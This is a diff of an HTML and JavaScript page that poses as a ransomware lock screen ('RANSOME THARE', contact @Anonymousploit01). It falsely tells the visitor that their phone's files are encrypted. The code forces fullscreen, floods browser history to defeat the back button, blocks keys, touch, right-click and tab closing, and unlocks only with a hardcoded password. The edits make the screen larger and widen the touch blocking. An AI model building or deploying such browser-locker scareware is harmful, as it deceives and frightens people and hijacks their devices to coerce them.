@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>HACKED - RANSOME THARE</title>
+    <title>RANSOME THARE - DEVICE LOCKED</title>
     <style>
         * {
             margin: 0;
@@ -14,9 +14,8 @@
         }
 
         body {
-            background: linear-gradient(135deg, #0a0a0a, #1a0000);
+            background: #0a0a0a;
             min-height: 100vh;
-            color: #ff3333;
             overflow: hidden;
             position: fixed;
             width: 100%;
@@ -24,14 +23,14 @@
             font-family: 'Courier New', monospace;
         }
 
-        /* LOCK SCREEN */
+        /* FULL SCREEN LOCK - CENTER HUGE */
         .lock-screen {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: linear-gradient(135deg, #0a0a0a, #1a0000);
+            background: linear-gradient(135deg, #000000, #1a0000);
             z-index: 99999;
             display: flex;
             flex-direction: column;
@@ -41,125 +40,127 @@
             padding: 20px;
         }
 
-        /* Skull Animation */
+        /* BIG SKULL */
         .skull {
-            font-size: 100px;
+            font-size: 120px;
             margin-bottom: 20px;
-            filter: drop-shadow(0 0 20px red);
+            filter: drop-shadow(0 0 25px red);
             animation: shake 0.5s infinite, glow 1s infinite;
         }
 
         @keyframes shake {
             0%,100% { transform: translateX(0); }
-            25% { transform: translateX(-3px); }
-            75% { transform: translateX(3px); }
+            25% { transform: translateX(-4px); }
+            75% { transform: translateX(4px); }
         }
 
         @keyframes glow {
             0%,100% { filter: drop-shadow(0 0 10px red); }
-            50% { filter: drop-shadow(0 0 25px #ff0000); }
+            50% { filter: drop-shadow(0 0 30px #ff0000); }
         }
 
-        /* HACKED TEXT */
+        /* BIG HACKED TEXT */
         .hacked-title {
-            font-size: 48px;
+            font-size: 55px;
             font-weight: bold;
             color: #ff0000;
-            letter-spacing: 5px;
+            letter-spacing: 8px;
             margin-bottom: 10px;
-            text-shadow: 0 0 10px red;
-            animation: blink 1s infinite;
+            text-shadow: 0 0 15px red;
+            animation: blink 0.8s infinite;
         }
 
         @keyframes blink {
             0%,100% { opacity: 1; }
-            50% { opacity: 0.6; }
+            50% { opacity: 0.5; }
         }
 
         .sub-text {
-            font-size: 18px;
+            font-size: 22px;
             color: #ff6666;
             margin-bottom: 30px;
-            letter-spacing: 2px;
+            letter-spacing: 3px;
         }
 
-        /* Message Box */
+        /* BIG MESSAGE BOX - TAKES HALF SCREEN */
         .message-box {
-            background: rgba(0,0,0,0.6);
-            border: 2px solid #ff0000;
-            border-radius: 20px;
-            padding: 20px;
-            width: 85%;
+            background: rgba(0,0,0,0.85);
+            border: 3px solid #ff0000;
+            border-radius: 30px;
+            padding: 35px 25px;
+            width: 90%;
+            max-width: 500px;
             margin-bottom: 30px;
+            box-shadow: 0 0 30px rgba(255,0,0,0.3);
         }
 
         .warning-text {
-            font-size: 14px;
+            font-size: 16px;
             color: #ff8888;
-            line-height: 1.5;
+            line-height: 1.6;
         }
 
         .highlight {
             color: #ff0000;
             font-weight: bold;
+            font-size: 18px;
         }
 
-        /* Device ID */
+        /* DEVICE ID */
         .device-id-box {
-            background: rgba(0,0,0,0.5);
-            padding: 10px;
-            border-radius: 10px;
-            margin-top: 10px;
+            background: rgba(0,0,0,0.6);
+            padding: 12px;
+            border-radius: 15px;
+            margin-top: 15px;
+            border: 1px solid #ff3333;
         }
 
         .device-id-label {
             font-size: 11px;
             color: #ff8888;
-        }
-
-        .device-id-value {
-            font-size: 16px;
-            font-weight: bold;
-            font-family: monospace;
-            color: #ff6666;
-        }
-
-        /* UNLOCK BUTTON */
-        .unlock-btn {
-            background: linear-gradient(135deg, #ff0000, #990000);
-            color: white;
-            border: none;
-            border-radius: 50px;
-            padding: 18px 40px;
-            font-size: 24px;
-            font-weight: bold;
-            cursor: pointer;
-            margin: 20px 0;
-            box-shadow: 0 0 20px rgba(255,0,0,0.5);
-            transition: 0.2s;
             letter-spacing: 2px;
         }
 
-        .unlock-btn:active {
-            transform: scale(0.96);
+        .device-id-value {
+            font-size: 18px;
+            font-weight: bold;
+            font-family: monospace;
+            color: #ff6666;
+            letter-spacing: 2px;
         }
 
-        /* Footer Text */
+        /* BIG UNLOCK BUTTON */
+        .unlock-btn {
+            background: linear-gradient(135deg, #ff0000, #660000);
+            color: white;
+            border: none;
+            border-radius: 60px;
+            padding: 20px 50px;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 15px 0;
+            box-shadow: 0 0 25px rgba(255,0,0,0.6);
+            transition: 0.1s;
+            letter-spacing: 3px;
+        }
+
+        .unlock-btn:active {
+            transform: scale(0.97);
+        }
+
+        /* FOOTER */
         .footer-text {
             position: absolute;
             bottom: 20px;
             font-size: 11px;
             color: #ff6666;
-            opacity: 0.6;
+            opacity: 0.5;
             text-align: center;
+            width: 100%;
         }
 
-        .footer-text a {
-            color: #ff6666;
-            text-decoration: none;
-        }
-
-        /* Password Modal */
+        /* PASSWORD MODAL */
         .password-modal {
             display: none;
             position: fixed;
@@ -175,48 +176,49 @@
 
         .password-box {
             background: #1a1a1a;
-            border-radius: 25px;
-            padding: 35px;
+            border-radius: 30px;
+            padding: 40px;
             width: 90%;
-            max-width: 350px;
+            max-width: 380px;
             text-align: center;
-            border: 2px solid #ff0000;
+            border: 3px solid #ff0000;
         }
 
         .password-box h3 {
             color: #ff0000;
-            margin-bottom: 20px;
-            font-size: 24px;
+            margin-bottom: 25px;
+            font-size: 28px;
         }
 
         .password-box input {
             width: 100%;
-            padding: 15px;
+            padding: 18px;
             border: none;
-            border-radius: 50px;
-            font-size: 20px;
+            border-radius: 60px;
+            font-size: 24px;
             text-align: center;
             background: white;
-            letter-spacing: 3px;
+            letter-spacing: 5px;
         }
 
         .password-box button {
             width: 100%;
-            padding: 15px;
-            margin-top: 20px;
+            padding: 16px;
+            margin-top: 25px;
             background: #ff0000;
             color: white;
             border: none;
-            border-radius: 50px;
-            font-size: 18px;
+            border-radius: 60px;
+            font-size: 20px;
             cursor: pointer;
             font-weight: bold;
         }
 
         .pass-error {
             color: #ff5555;
-            margin-top: 12px;
+            margin-top: 15px;
             display: none;
+            font-size: 14px;
         }
 
         .success-toast {
@@ -226,9 +228,10 @@
             transform: translate(-50%, -50%);
             background: #4caf50;
             color: white;
-            padding: 15px 30px;
-            border-radius: 50px;
-            font-size: 18px;
+            padding: 18px 35px;
+            border-radius: 60px;
+            font-size: 20px;
+            font-weight: bold;
             z-index: 300000;
             display: none;
             white-space: nowrap;
@@ -237,7 +240,7 @@
 </head>
 <body>
 
-    <!-- LOCK SCREEN -->
+    <!-- LOCK SCREEN - CENTER HUGE -->
     <div id="lockScreen" class="lock-screen">
         <div class="skull">💀</div>
         <div class="hacked-title">HACKED</div>
@@ -248,8 +251,7 @@
                 🔒 <span class="highlight">YOUR PHONE HAS BEEN LOCKED</span> 🔒<br><br>
                 All your files, photos, and data have been encrypted.<br><br>
                 To unlock your device, you need to enter the correct password.<br><br>
-                <span class="highlight">DO NOT CLOSE THIS SCREEN</span><br>
-                If you close it, your data may be lost forever.
+                <span class="highlight">DO NOT CLOSE THIS SCREEN</span>
             </div>
             <div class="device-id-box">
                 <div class="device-id-label">🔐 DEVICE ID</div>
@@ -260,14 +262,14 @@
         <button class="unlock-btn" id="unlockBtn">🔓 UNLOCK DEVICES</button>
         
         <div class="footer-text">
-            ⚠️ Contact: @Anonymousploit01 | RANSOME THARE
+            ⚠️ @Anonymousploit01 | RANSOME THARE
         </div>
     </div>
 
     <!-- PASSWORD MODAL -->
     <div id="passwordModal" class="password-modal">
         <div class="password-box">
-            <h3>🔐 ENTER UNLOCK PASSWORD</h3>
+            <h3>🔐 ENTER PASSWORD</h3>
             <input type="password" id="unlockPassword" maxlength="6" placeholder="******" autocomplete="off">
             <button onclick="verifyPassword()">UNLOCK NOW</button>
             <div id="passError" class="pass-error">❌ Wrong password! Try again.</div>
@@ -275,18 +277,17 @@
     </div>
 
     <!-- SUCCESS TOAST -->
-    <div id="successToast" class="success-toast">✅ UNLOCKED! Device will exit now.</div>
+    <div id="successToast" class="success-toast">✅ UNLOCKED! Exiting...</div>
 
     <script>
         // ========== PASSWORD ==========
         const UNLOCK_PASSWORD = "123456";
         
-        // ========== GENERATE DEVICE ID ==========
+        // ========== DEVICE ID ==========
         function generateDeviceId() {
             return 'THARE-' + Math.floor(10000 + Math.random() * 90000).toString();
         }
 
-        // Get or create device ID
         let deviceId = localStorage.getItem('ransome_device_id');
         if (!deviceId) {
             deviceId = generateDeviceId();
@@ -294,7 +295,7 @@
         }
         document.getElementById('deviceId').innerText = deviceId;
 
-        // ========== FULLSCREEN MODE ==========
+        // ========== FULLSCREEN ==========
         function enterFullscreen() {
             const elem = document.documentElement;
             if (elem.requestFullscreen) elem.requestFullscreen();
@@ -302,13 +303,7 @@
             else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
         }
 
-        // Re-enter fullscreen if exited
         document.addEventListener('fullscreenchange', function() {
-            if (!document.fullscreenElement && !document.webkitFullscreenElement) {
-                setTimeout(() => enterFullscreen(), 100);
-            }
-        });
-        document.addEventListener('webkitfullscreenchange', function() {
             if (!document.fullscreenElement && !document.webkitFullscreenElement) {
                 setTimeout(() => enterFullscreen(), 100);
             }
@@ -316,54 +311,43 @@
 
         // ========== BLOCK ALL EXITS ==========
         function blockAllExits() {
-            // Block back button
-            for(let i = 0; i < 30; i++) {
+            for(let i = 0; i < 50; i++) {
                 window.history.pushState(null, '', window.location.href);
             }
             
             window.addEventListener('popstate', function(e) {
-                for(let i = 0; i < 30; i++) {
+                for(let i = 0; i < 50; i++) {
                     window.history.pushState(null, '', window.location.href);
                 }
             });
 
-            // Block tab close warning
             window.addEventListener('beforeunload', function(e) {
                 e.preventDefault();
-                e.returnValue = '🔒 DEVICE LOCKED! Enter password to unlock.';
-                return '🔒 DEVICE LOCKED! Enter password to unlock.';
+                e.returnValue = '🔒 DEVICE LOCKED!';
+                return '🔒 DEVICE LOCKED!';
             });
 
-            // Block all keyboard keys
             document.addEventListener('keydown', function(e) {
                 e.preventDefault();
                 return false;
             });
 
-            // Block all touch events on lock screen (except unlock button)
-            const lockScreen = document.getElementById('lockScreen');
-            lockScreen.addEventListener('touchstart', function(e) {
+            document.addEventListener('touchstart', function(e) {
                 if (e.target.id !== 'unlockBtn' && !e.target.classList.contains('unlock-btn')) {
                     e.preventDefault();
                 }
             });
-            lockScreen.addEventListener('touchmove', function(e) {
+            document.addEventListener('touchmove', function(e) {
                 e.preventDefault();
             });
 
-            // Block context menu
             document.addEventListener('contextmenu', function(e) {
                 e.preventDefault();
                 return false;
             });
-
-            // Block wheel/scroll
-            document.addEventListener('wheel', function(e) {
-                e.preventDefault();
-            }, { passive: false });
         }
 
-        // ========== SHOW PASSWORD MODAL ==========
+        // ========== PASSWORD MODAL ==========
         function showPasswordModal() {
             document.getElementById('passwordModal').style.display = 'flex';
             document.getElementById('unlockPassword').value = '';
@@ -386,7 +370,6 @@
                 }, 1500);
             } else {
                 document.getElementById('passError').style.display = 'block';
-                // Shake effect on error
                 const box = document.querySelector('.password-box');
                 box.style.animation = 'shake 0.3s';
                 setTimeout(() => {
@@ -406,16 +389,12 @@
         function init() {
             enterFullscreen();
             blockAllExits();
-            
-            // Push history continuously
             setInterval(() => {
                 window.history.pushState(null, '', window.location.href);
             }, 300);
         }
 
-        // Unlock button click
         document.getElementById('unlockBtn').addEventListener('click', showPasswordModal);
-
         init();
     </script>
 </body>
